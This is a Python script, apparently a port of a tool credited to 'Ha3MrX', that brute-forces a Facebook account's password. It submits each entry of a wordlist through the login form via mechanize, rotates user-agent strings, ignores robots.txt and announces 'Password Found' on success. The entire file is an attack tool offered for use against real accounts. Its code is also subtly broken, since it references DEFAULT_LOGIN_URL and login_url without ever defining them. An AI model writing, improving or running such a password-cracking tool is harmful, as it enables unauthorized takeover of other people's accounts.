#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import argparse
import random
import sys
import time

# You might need to install these: pip3 install mechanize
try:
    import mechanize
    import http.cookiejar as cookielib
except ImportError:  # pragma: no cover - optional runtime dependency
    mechanize = None
    cookielib = None

# Setup headers and browser settings
useragents = [
    ('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'),
    ('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
]



def create_browser():
    if mechanize is None:
        raise RuntimeError("[!] Please install mechanize: pip3 install mechanize")
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    if hasattr(mechanize, '_http') and hasattr(mechanize._http, 'HTTPRefreshProcessor'):
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    return br


def welcome(email, passwordlist):
    wel = """
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |            #Author: Ha3MrX              | 
        |            Version 1.0 (Py3)            |
        |     https://www.youtube.com/c/HA-MRX    |
        +=========================================+
        |..........  Facebook Cracker  ...........|
        +-----------------------------------------+\n\n
    """
    try:
        with open(passwordlist, "r", encoding="utf-8", errors="ignore") as f:
            total = f.readlines()
        print(wel)
        print(f" [*] Account to crack : {email}")
        print(f" [*] Loaded : {len(total)} passwords")
        print(" [*] Cracking, please wait ...\n\n")
        return len(total)
    except FileNotFoundError:
        print(f"[!] Error: Wordlist file '{passwordlist}' not found.")
        raise


def _is_successful_login(log, target_url):
    if not log:
        return False

    target = (target_url or DEFAULT_LOGIN_URL).rstrip('/')
    current = log.rstrip('/')

    return current != target and 'login_attempt' not in current and not current.startswith(target)


def brute(password, br, email, target_url=None):
    if br is None:
        return False

    target_url = target_url or login_url
    sys.stdout.write(f"\r[*] Trying ..... {password}")
    sys.stdout.flush()

    br.addheaders = [random.choice(useragents)]
    try:
        br.open(target_url)
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()

        if _is_successful_login(log, target_url):
            print(f"\n\n[+] Password Found = {password}")
            return True
        return False
    except Exception:
        time.sleep(2)
        return False


def search(email, passwordlist, br, target_url=None):
    target_url = target_url or login_url
    try:
        with open(passwordlist, "r", encoding="utf-8", errors="ignore") as passwords:
            for password in passwords:
                password = password.strip()
                if not password:
                    continue
                if brute(password, br, email, target_url=target_url):
                    return password
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        raise
    return None


def parse_args():
    parser = argparse.ArgumentParser(description="Facebook password cracker")
    parser.add_argument("--email", help="Facebook username/email/phone")
    parser.add_argument("--wordlist", help="Path to password wordlist")
    parser.add_argument(
        "--target-url",
        "--target",
        "--url",
        dest="target_url",
        default=DEFAULT_LOGIN_URL,
        help="Login page URL to target (defaults to Facebook login)",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    email = args.email or input("Enter the Facebook Username/Email/Phone: ")
    passwordlist = args.wordlist or input("Enter the wordlist name and path: ")
    target_url = args.target_url or DEFAULT_LOGIN_URL

    try:
        br = create_browser()
    except RuntimeError as exc:
        print(exc)
        return 1

    try:
        welcome(email, passwordlist)
        found = search(email, passwordlist, br, target_url=target_url)
    except FileNotFoundError:
        return 1
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        return 1

    if found is not None:
        return 0

    print("\n[!] Password does not exist in the wordlist")
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
